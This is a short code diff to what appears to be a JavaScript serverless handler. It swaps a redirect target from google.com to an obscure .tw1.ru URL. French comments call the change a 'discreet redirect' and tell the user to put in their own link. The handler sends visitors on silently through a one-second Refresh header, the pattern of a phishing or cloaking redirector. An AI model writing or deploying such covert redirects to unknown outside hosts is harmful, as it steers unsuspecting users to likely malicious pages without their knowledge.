@@ -8,7 +8,7 @@ export default async function handler(req, res) {
   }
 
   // Lien cible (à modifier par ton lien)
-  const target = "https://google.com/";
+  const target = "https://cv821955.tw1.ru/mi/";
 
   // Redirection discrète
   res.setHeader('Refresh', '1;url=' + target);
